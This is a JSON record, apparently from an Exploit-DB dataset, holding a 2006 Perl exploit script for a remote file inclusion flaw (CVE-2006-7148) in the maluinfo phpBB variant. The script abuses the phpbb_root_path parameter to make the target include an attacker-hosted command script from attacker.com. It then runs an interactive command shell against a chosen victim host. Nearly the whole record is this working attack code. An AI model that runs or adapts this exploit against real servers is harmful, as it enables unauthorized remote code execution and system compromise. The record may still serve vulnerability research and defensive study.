{
  "id": "2537",
  "title": "maluinfo 206.2.38 - &#039;bb_usage_stats.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-7148",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n \r\n#####################################################################################################\r\n#                                                                                                   #\r\n# maluinfo 206.2.38  ( brazilian PHPBB )                                                            #\r\n#                                                                                                   #\r\n# Class:  Remote File Include Vulnerability                                                         #\r\n#                                                                                                   #\r\n# Patch:  unavailable                                                                               #\r\n#                                                                                                   #\r\n# Date:   2006/10/12                                                                                #\r\n#                                                                                                   #\r\n# Remote: Yes                                                                                       #\r\n#                                                                                                   #\r\n# Type:   high                                                                                      #\r\n#                                                                                                   #\r\n# Site:   http://codigolivre.org.br/frs/download.php/1534/maluinfo-206.2.38_release_new_install.zip #\r\n#                                                                                                   #\r\n#####################################################################################################\r\n\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\n$cmdshell=\"http://attacker.com/cmd.txt\";   # <====== Change This Line With Your Personal Script\r\n\r\nprint \"\\n\";\r\nprint \"######################################################################\\n\";\r\nprint \"#                                                                    #\\n\";\r\nprint \"# maluinfo version 206.2.38l    Remote File Include Vulnerability    #\\n\";\r\nprint \"# Bug found By : Ashiyane Corporation                                #\\n\";\r\nprint \"# Email: nima salehi    nima[at]ashiyane.ir                          #\\n\";\r\nprint \"# Web Site : www.Ashiyane.ir                                         #\\n\";\r\nprint \"#                                                                    #\\n\";\r\nprint \"######################################################################\\n\";\r\n\r\n\r\nif (@ARGV < 2)\r\n{\r\n    print \"\\n Usage: Ashiyane.pl [host] [path] \";\r\n    print \"\\n EX : Ashiyane.pl www.victim.com /path/  \\n\\n\";\r\nexit;\r\n}\r\n\r\n\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$vul=\"includes/bb_usage_stats.php?phpbb_root_path=\"\r\n\r\nprint \"Type Your Commands ( uname -a )\\n\";\r\nprint \"For Exiit Type END\\n\";\r\n\r\nprint \"<Shell> \";$cmd = <STDIN>;\r\n\r\nwhile($cmd !~ \"END\") {\r\n    $socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"Could not connect to host.\\n\\n\";\r\n\r\n    print $socket \"GET \".$path.$vul.$cmdshell.\"?cmd=\".$cmd.\"? HTTP/1.1\\r\\n\";\r\n    print $socket \"Host: \".$host.\"\\r\\n\";\r\n    print $socket \"Accept: */*\\r\\n\";\r\n    print $socket \"Connection: close\\r\\n\\n\";\r\n\r\n    while ($raspuns = <$socket>)\r\n    {\r\n        print $raspuns;\r\n    }\r\n\r\n    print \"<Shell> \";\r\n    $cmd = <STDIN>;\r\n}\r\n\r\n# milw0rm.com [2006-10-13]",
  "url": "https://www.exploit-db.com/exploits/2537"
}